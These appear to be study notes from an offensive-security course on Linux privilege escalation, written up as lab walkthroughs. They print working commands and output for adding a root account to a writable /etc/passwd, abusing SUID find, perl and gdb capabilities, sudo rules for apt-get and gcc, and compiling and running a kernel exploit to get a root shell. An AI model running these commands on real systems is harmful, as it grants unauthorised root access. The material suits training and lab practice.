 - Using arg `passwd`
 - If no other option is specified, the hash will be generated with [crypt algorithm](https://en.wikipedia.org/wiki/Crypt_(C))
  - A supported hash for Linux auth.
  - *The output of the OpenSSL passwd command may vary depending on the system executing it. On older systems, it may default to the DES algorithm, while on some newer systems it could output the password in MD5 format.*.
- We then add the line to `/etc/passwd`
```bash
joe@debian-privesc:~$ openssl passwd w00t
bAoT00dpc4dtE
joe@debian-privesc:~$ echo "root2:bAoT00dpc4dtE:0:0:root:/root:/bin/bash" >> /etc/passwd
joe@debian-privesc:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
tss:x:105:111:TPM2 software stack,,,:/var/lib/tpm:/bin/false
dnsmasq:x:106:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:108:114:RealtimeKit,,,:/proc:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
pulse:x:110:118:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
speech-dispatcher:x:111:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
avahi:x:112:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
saned:x:113:121::/var/lib/saned:/usr/sbin/nologin
colord:x:114:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
geoclue:x:115:123::/var/lib/geoclue:/usr/sbin/nologin
hplip:x:116:7:HPLIP system user,,,:/var/run/hplip:/bin/false
Debian-gdm:x:117:124:Gnome Display Manager:/var/lib/gdm3:/bin/false
joe:x:1000:1000:joe,,,:/home/joe:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
eve:x:1001:1001:,,,:/home/eve:/bin/bash
lightdm:x:118:125:Light Display Manager:/var/lib/lightdm:/bin/false
root2:bAoT00dpc4dtE:0:0:root:/root:/bin/bash

joe@debian-privesc:~$ su root2
Password: 
root@debian-privesc:/home/joe# id
uid=0(root) gid=0(root) groups=0(root)
```

As shown we have added `root2` with password `w00t` to `/etc/passwd`.  We then use `su` to switch to our new user and issue `id` to show that we have gained root privs.

It may seem unlikely to find `/etc/passwd` world-writeable, but there are many cases where security is compromised for usability.

###### Exercises

Connect to VM 2 and get the flag by elevating to a root shell through password authentication abuse.
```bash
┌──(operator㉿labhost)-[~/OffSec/lin-priv-esc]
└─$ ssh -o PubKeyAuthentication=no joe@192.168.248.214
joe@192.168.248.214's password: 
Linux debian-privesc 4.19.0-21-amd64 #1 SMP Debian 4.19.249-2 (2022-06-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Feb 15 04:15:11 2023 from 192.168.118.3
joe@debian-privesc:~$ find /etc -writable -type d 2>/dev/null
joe@debian-privesc:~$ ls -lha /etc/passwd
-rw-r--rw- 1 root root 2.3K Aug 29  2022 /etc/passwd
joe@debian-privesc:~$ ls -lha /etc/shadow
-rw-r----- 1 root shadow 1.5K Nov  1 23:13 /etc/shadow
joe@debian-privesc:~$ openssl passwd w00t
IQQxizB3p9wXE
joe@debian-privesc:~$ echo "root2:IQQxizB3p9wXE:0:0:root:/root:/bin/bash" >> /etc/passwd
joe@debian-privesc:~$ tail /etc/passwd
saned:x:113:121::/var/lib/saned:/usr/sbin/nologin
colord:x:114:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
geoclue:x:115:123::/var/lib/geoclue:/usr/sbin/nologin
hplip:x:116:7:HPLIP system user,,,:/var/run/hplip:/bin/false
Debian-gdm:x:117:124:Gnome Display Manager:/var/lib/gdm3:/bin/false
joe:x:1000:1000:joe,,,:/home/joe:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
eve:x:1001:1001:,,,:/home/eve:/bin/bash
lightdm:x:118:125:Light Display Manager:/var/lib/lightdm:/bin/false
root2:IQQxizB3p9wXE:0:0:root:/root:/bin/bash
joe@debian-privesc:~$ su root2
Password: 
root@debian-privesc:/home/joe# id
uid=0(root) gid=0(root) groups=0(root)
root@debian-privesc:/home/joe# ls /root/
flag.txt
root@debian-privesc:/home/joe# cat /root/flag.txt 
OS{965ad9ef01013eda6edc9fff6e8e7e5e}
```


#### Insecure System Components 17.4

- Abuse SUID programs and capabilities for privilege escalation.
- Circumvent special sudo permissions to escalate privileges.
- Enumerate the system's kernel for known vulnerabilities, then abuse them for privilege escalation.

##### Abusing Setuid Binaries and Capabilities

As we saw earlier, `setuid` binaries can lead to PrivEsc when not properly secured.  Before we attempt the exploit let's review the purpose behind a setuid binary with an example.

When a user or a system-automated script launches a proc, it inherits the UID/GUID of the initiating script, known as the real UID/GID.

User password hashes within `/etc/shadow`, owned by root (uid=0).  How can a non-priv user access the file to change their own password?  To circumvent, the effective UID/GID was introduced, representing the actual value that is checked when performing priv operations.

Let's analyze the `passwd` program, responsible for changing the password for the user who executes it.  On our Debian lab machine, we'll connect as `joe` and execute the `passwd` command without typing anything afterwards (keeping the process in active memory).
```bash
joe@debian-privesc:~$ passwd
Changing password for joe.
Current password: 
```

Open another shell to further inspect the process.  We can find the PID of the `passwd` proc by listing processes and filtering out the target name.
```bash
joe@debian-privesc:~$ ps -u -C passwd
error: user name does not exist

Usage:
 ps [options]

 Try 'ps --help <simple|list|output|threads|misc|all>'
  or 'ps --help <s|l|o|t|m|a>'
 for additional help text.

For more details see ps(1).
joe@debian-privesc:~$ ps u -C passwd
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root      1324  0.0  0.1   9364  2996 pts/0    S+   23:31   0:00 passwd
```
- As we see `passwd` is running as the root user.
 - Necessary for it to access and modify `/etc/shadow`

We can also inspect the real UID and effective UID assigned for the proc by inspecting the proc pseudo-filesystem, which allows us to interact with kernel info.  Using the passwd's PID (1324) from previous output, we can inspect the content at `/proc/1932/status` which provides a summary of the process attributes.
```bash
joe@debian-privesc:~$ cat /proc/1324/status
Name:	passwd
Umask:	0077
State:	S (sleeping)
Tgid:	1324
Ngid:	0
Pid:	1324
PPid:	1251
TracerPid:	0
Uid:	1000	0	0	0
Gid:	1000	1000	1000	1000
FDSize:	256
Groups:	24 25 29 30 44 46 109 112 116 117 1000 
NStgid:	1324
NSpid:	1324
NSpgid:	1324
NSsid:	1251
VmPeak:	    9460 kB
VmSize:	    9364 kB
VmLck:	       0 kB
VmPin:	       0 kB
VmHWM:	    2996 kB
VmRSS:	    2996 kB
RssAnon:	     304 kB
RssFile:	    2692 kB
RssShmem:	       0 kB
VmData:	     596 kB
VmStk:	     132 kB
VmExe:	      40 kB
VmLib:	    2408 kB
VmPTE:	      52 kB
VmSwap:	       0 kB
HugetlbPages:	       0 kB
CoreDumping:	0
Threads:	1
SigQ:	0/7820
SigPnd:	0000000000000000
ShdPnd:	0000000000000000
SigBlk:	0000000000080000
SigIgn:	0000000000287007
SigCgt:	0000000180000000
CapInh:	0000000000000000
CapPrm:	0000003fffffffff
CapEff:	0000003fffffffff
CapBnd:	0000003fffffffff
CapAmb:	0000000000000000
NoNewPrivs:	0
Seccomp:	0
Speculation_Store_Bypass:	thread vulnerable
Cpus_allowed:	3
Cpus_allowed_list:	0-1
Mems_allowed:	00000000,00000001
Mems_allowed_list:	0
voluntary_ctxt_switches:	4
nonvoluntary_ctxt_switches:	3
```

the `passwd` bin behaves this way because of a special flag called Set-User-ID, SUID for short.
```bash
joe@debian-privesc:~$ ls -asl /usr/bin/passwd 
64 -rwsr-xr-x 1 root root 63736 Jul 27  2018 /usr/bin/passwd
```
- The SUID flag is the `s` in the above output.
 - The flag can be configured with `chmod u+s <fname>`
 - It sets the eUID of the proc to the exec owner UID (root)

The result is legitimate constrained PrivEsc, the SUID bin must be bug-free to avoid any misuse of the app.

A practical example, after completing manual enum, we'll have discovered that the `find` utility is misconfigured and has the SUID flag set.
- We can abuse this by using `find` to search well-known file, like our Desktop folder.
 - Once the file is found we can have `find` perform an action through the `-exec` param.
- We want to exec a bash shell along with the [Set Builtin](https://www.gnu.org/software/bash/manual/html_node/The-Set-Builtin.html) `-p` param.
 - Preventing the effective user from being reset.
```bash
joe@debian-privesc:~$ find /home/joe/Desktop/ -exec "/usr/bin/bash" -p \;
bash-5.0# id
uid=1000(joe) gid=1000(joe) euid=0(root) groups=1000(joe),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),112(bluetooth),116(lpadmin),117(scanner)
bash-5.0# whoami
root
bash-5.0# which find
/usr/bin/find
bash-5.0# ls -asl /usr/bin/find
312 -rwsr-xr-x 1 root root 315904 Feb 16  2019 /usr/bin/find
```
- We observe that the UID still belongs to `joe`
 - The eUID is now `root`

Another set of features subject to PrivEsc are [Linux capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- Capabilities are extra attributes that can be applied to.
 - Procs.
 - Bins.
 - Services.
- They assign specific privs normally reserved for admin ops.
 - Traffic capture.
 - Manipulating kernel modules.
 - Etc.

Similar to SUID bins, if misconfigued capabilities could allow an attacker to elevate their privs to root.  To demonstrate let's manually enum our target for bins with capabilities.
- Run `getcap`
- Recursive search `-r`
- From root folder `/`
- Filtering out errors from output.
```bash
joe@debian-privesc:~$ /usr/sbin/getcap -r / 2>/dev/null
/usr/bin/ping = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep
/usr/bin/perl5.28.1 = cap_setuid+ep
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```
- Two `perl` bins stand out.
 - They have `setuid` capabilities.
 - Effective and permitted `+ep`
*Even though they seem similar, capabilities, setuid, and the setuid flag are located in different places within the Linux ELF file format.*

To exploit this miscofig, we could check the GTFOBins website, which provides an organized list of UNIX bins and how they can be misused for PrivEsc.
- [GTFOBins](https://gtfobins.github.io/)
We search for "Perl" and find precise instructions on how to exploit the capabilities.  We'll use the command which executes a shell along with POSIX directives enabling setuid.
```bash
joe@debian-privesc:~$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
# id
uid=0(root) gid=1000(joe) groups=1000(joe),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),112(bluetooth),116(lpadmin),117(scanner)
# whoami
root
```

###### Exercises

Connect to VM 2 and gain a root shell by abusing capabilities.
```bash
joe@debian-privesc:~$ /usr/sbin/getcap -r / 2>/dev/null
/usr/bin/gdb = cap_setuid+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
joe@debian-privesc:~$ which gdb
/usr/bin/gdb
joe@debian-privesc:~$ /usr/bin/gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit
GNU gdb (Debian 8.2.1-2+b3) 8.2.1
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word".
# id
uid=0(root) gid=1000(joe) groups=1000(joe),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),112(bluetooth),116(lpadmin),117(scanner)
# whoami
root
# ls /root	
flag.txt
# cat /root/flag.txt
OS{e9dad60560a182bf3fb999ddb1a7d059}
```


##### Abusing Sudo

On UNIX like systems, `sudo` can be used to exec a command with elevated privs.  To use `sudo` our un-priv user must be a member of the sudo group (Debian based distros).  The word sudo stands for "Superuser-Do", think of it as changing the eUID of the executed command.

Custom configs of the sudo-related perms can be applied in the `/etc/sudoers` file.  We can use the `-l` or `--list` option to list the allowed commands for the current user.
```bash
joe@debian-privesc:~$ sudo -l
[sudo] password for joe: 
Matching Defaults entries for joe on debian-privesc:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User joe may run the following commands on debian-privesc:
    (ALL) /usr/bin/crontab -l, /usr/sbin/tcpdump, /usr/bin/apt-get
```
- We see that `crontab`, `tcpdump`, and `apt-get` are allowing sudo commands.

If the `/etc/sudoers` configs are too permissive user's could abuse to obtain permanent root.

Since the first of the 3 permitted commands does not allow us to edit `crontab` it's unlikely we can use it for PrivEsc.  The second command looks more promising so we browse GTFOBins for suggestions.  Running the command reveals an unexpected outcome.
```bash
joe@debian-privesc:~$ sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
dropped privs to root
tcpdump: listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes
Maximum file limit reached: 1
1 packet captured
62 packets received by filter
0 packets dropped by kernel
compress_savefile: execlp(/tmp/tmp.zkRMfxFPP3, /dev/null) failed: Permission denied
```
- We are prompted with a "permission denied" error.

To investigate, inspect `syslog` for any occurrence of `tcpdump`
```bash
joe@debian-privesc:~$ cat /var/log/syslog | grep tcpdump
Nov  2 10:09:07 debian-privesc kernel: [  773.917028] audit: type=1400 audit(1698937747.856:24): apparmor="DENIED" operation="exec" profile="/usr/sbin/tcpdump" name="/tmp/tmp.zkRMfxFPP3" pid=2453 comm="tcpdump" requested_mask="x" denied_mask="x" fsuid=0 ouid=1000
```
- [audit](https://man7.org/linux/man-pages/man8/auditd.8.html)
 - Audit daemon logged our attempt.
- [AppArmor](https://apparmor.net/)
 - Was triggered blocking us.

AppArmor is a kernel module providing mandatory access control (MAC) on Linux systems by running app specific profiles, it's enabled by default on Debian 10.  We can verify AppArmor's status as the root user using the `aa-status` command.
```bash
joe@debian-privesc:~$ su - root
Password:
root@debian-privesc:~# aa-status
apparmor module is loaded.
20 profiles are loaded.
18 profiles are in enforce mode.
   /usr/bin/evince
   /usr/bin/evince-previewer
   /usr/bin/evince-previewer//sanitized_helper
   /usr/bin/evince-thumbnailer
   /usr/bin/evince//sanitized_helper
   /usr/bin/man
   /usr/lib/cups/backend/cups-pdf
   /usr/sbin/cups-browsed
   /usr/sbin/cupsd
   /usr/sbin/cupsd//third_party
   /usr/sbin/tcpdump
...
2 profiles are in complain mode.
   libreoffice-oopslash
   libreoffice-soffice
3 processes have profiles defined.
3 processes are in enforce mode.
   /usr/sbin/cups-browsed (502)
   /usr/sbin/cupsd (654)
   /usr/lib/cups/notifier/dbus (658) /usr/sbin/cupsd
0 processes are in complain mode.
0 processes are unconfined but have a profile defined.
```
- We can see `tcpdump` is protected with an AppArmor profile.

The first two sudoers commands did not work, we check the third command `apt-get`.
```bash
sudo apt-get changelog apt
!/bin/sh
```
- Runs the `apt-get` changelog command.
 - Invoking `less` app from which we exec a bash shell.
```bash
joe@debian-privesc:~$ sudo apt-get changelog apt
Get:1 store: apt 1.8.2.3 Changelog
Fetched 459 kB in 0s (0 B/s)
# id
uid=0(root) gid=0(root) groups=0(root)
```


###### Exercises

Connect to VM 2 and gain a root shell by abusing a sudo misconfiguration.
```bash
joe@debian-privesc:~$ sudo gcc -wrapper /bin/sh,-s .
# id
uid=0(root) gid=0(root) groups=0(root)
# whoami
root
# ls /root
flag.txt
# cat /root/flag.txt
OS{1b14ce5095e6ff3cb0b37dfd1121d1ab}
```


##### Exploiting Kernel Vulnerabilities

Depending on the OS and kernel version, another excellent way to achieve PrivEsc are kernel exploits.

To demonstrate this vectore we must first gather info about the target by inspecting the `/etc/issue` file,  As we learned earlier, this file contains text and system ID into that is printed to the login prompt on Linux machines.
```bash
joe@ubuntu-privesc:~$ cat /etc/issue
Ubuntu 16.04.4 LTS \n \l
```

We must next inspect the kernel version and get the sys arch.
```bash
joe@ubuntu-privesc:~$ uname -r
4.4.0-116-generic
joe@ubuntu-privesc:~$ arch
x86_64
```

The target sys appears to be running Ubuntu 16.04.3 LTS (kernel 4.4.0-116-generic) on the x86_64 arch.  We can use this info with `searchsploit` on our Kali machine to find kernel exploits that match the target.
- Main keyword `linux kernel Ubuntu 16 Local Privilege Escalation`
- Exclude anything below kernel version 4.4.0.
- Exclude anything matching kernel version 4.9.
```bash
┌──(operator㉿labhost)-[~/OffSec/lin-priv-esc]
└─$ searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation" | grep "4." | grep -v " < 4.4.0" | grep -v "4.8"
Linux Kernel (Debian 7.7/8.5/9.0 / Ubuntu 14.04.2/16.0 | linux_x86-64/local/42275.c
Linux Kernel (Debian 9/10 / Ubuntu 14.04.5/16.04.2/17. | linux_x86/local/42276.c
Linux Kernel (Ubuntu / Fedora / RedHat) - 'Overlayfs'  | linux/local/40688.rb
Linux Kernel (Ubuntu 17.04) - 'XFRM' Local Privilege E | linux/local/44049.md
Linux Kernel 2.6.24_16-23/2.6.27_7-10/2.6.28.3 (Ubuntu | linux_x86-64/local/9083.c
Linux Kernel 2.6.37 (RedHat / Ubuntu 10.04) - 'Full-Ne | linux/local/15704.c
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/1 | linux/local/37292.c
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/1 | linux/local/37293.txt
Linux Kernel 3.4 < 3.13.2 (Ubuntu 13.04/13.10 x64) - ' | linux_x86-64/local/31347.c
Linux Kernel 3.x (Ubuntu 14.04 / Mint 17.3 / Fedora 22 | linux/local/41999.txt
Linux Kernel 4.3.3 (Ubuntu 14.04/15.10) - 'overlayfs'  | linux/local/39166.c
Linux Kernel 4.4 (Ubuntu 16.04) - 'BPF' Local Privileg | linux/local/40759.rb
Linux Kernel 4.4.0-21 (Ubuntu 16.04 x64) - Netfilter ' | linux_x86-64/local/40049.c
Linux Kernel 4.4.x (Ubuntu 16.04) - 'double-fdput()' b | linux/local/39772.txt
Linux Kernel 4.6.2 (Ubuntu 16.04.1) - 'IP6T_SO_SET_REP | linux/local/40489.txt
Linux Kernel < 2.6.34 (Ubuntu 10.10 x86) - 'CAP_SYS_AD | linux_x86/local/15916.c
Linux Kernel < 2.6.36-rc1 (Ubuntu 10.04 / 2.6.32) - 'C | linux/local/14814.c
Linux Kernel < 2.6.36.2 (Ubuntu 10.04) - 'Half-Nelson. | linux/local/17787.c
Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Loc | linux/local/45010.c
```
- We will try the last exploit `linux/local/45010.c` since it is newer and matches our kernel version.
- It also targets any kernel version below 4.13.9.

We use `gcc` on Linux to compile our exploit, matching the arch of our target.  This is imperative when the target does not have a compiler and we are forced to compile locally or in a sandbox env replicating the target.

Learning every detail of a Linux kernel exploit is beyond the scope of this module, we need to know how to compile the code.  First we will copy the exploit to our working dir and inspect the first lines for compilation instructions.
```bash
┌──(operator㉿labhost)-[~/OffSec/lin-priv-esc]
└─$ head -n 20 45010.c
/*
  Credit @bleidl, this is a slight modification to his original POC
  https://github.com/brl/grlh/blob/master/get-rekt-linux-hardened.c

  For details on how the exploit works, please visit
  https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html

  Tested on Ubuntu 16.04 with the following Kernels
  4.4.0-31-generic
  4.4.0-62-generic
  4.4.0-81-generic
  4.4.0-116-generic
  4.8.0-58-generic
  4.10.0.42-generic
  4.13.0-21-generic

  Tested on Fedora 27
  4.13.9-300
  gcc cve-2017-16995.c -o cve-2017-16995
  internet@client:~/cve-2017-16995$ ./cve-2017-16995
                                                                                         
┌──(operator㉿labhost)-[~/OffSec/lin-priv-esc]
└─$ gcc 45010.c -o cve-2017-16995      
                                                                                         
┌──(operator㉿labhost)-[~/OffSec/lin-priv-esc]
└─$ ls          
45010.c  cve-2017-16995
```
- To assure compilation works as expected and if the target has GCC.
 - We can compile on target.
- This assures the correct libs are used for the target arch.
- Lowers the risks of cross compatibility issues.
```bash
┌──(operator㉿labhost)-[~/OffSec/lin-priv-esc]
└─$ scp -o PubKeyAuthentication=no 45010.c joe@192.168.216.216:~/
joe@192.168.216.216's password: 
45010.c
```
- On target.
```bash
joe@ubuntu-privesc:~$ gcc 45010.c -o cve-2017-16995
joe@ubuntu-privesc:~$ ls
45010.c  cve-2017-16995
```
- We can safely assume GCC compile it correctly as it output no errors.

We can inspect the Linux ELF file arch with `file`
```bash
joe@ubuntu-privesc:~$ file cve-2017-16995 
cve-2017-16995: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=dd15fe9ed0b8bc7da0ee0d0dc643a5cb29f83bf1, not stripped
```

We are now ready to run our kernel exploit!
```bash
joe@ubuntu-privesc:~$ ./cve-2017-16995 
[.] 
[.] t(-_-t) exploit for counterfeit grsec kernels such as KSPP and linux-hardened t(-_-t)
[.] 
[.]   ** This vulnerability cannot be exploited at all on authentic grsecurity kernel **
[.] 
[*] creating bpf map
[*] sneaking evil bpf past the verifier
[*] creating socketpair()
[*] attaching bpf backdoor to socket
[*] skbuff => ffff880035232000
[*] Leaking sock struct from ffff88003367f400
[*] Sock->sk_rcvtimeo at offset 472
[*] Cred structure at ffff88007c0f1180
[*] UID from cred structure: 1001, matches the current: 1001
[*] hammering cred structure at ffff88007c0f1180
[*] credentials patched, launching shell...
# id
uid=0(root) gid=0(root) groups=0(root),1001(joe)
# whoami
root
```
- We have successfully obtained a root shell by exploiting a known kernel vuln.
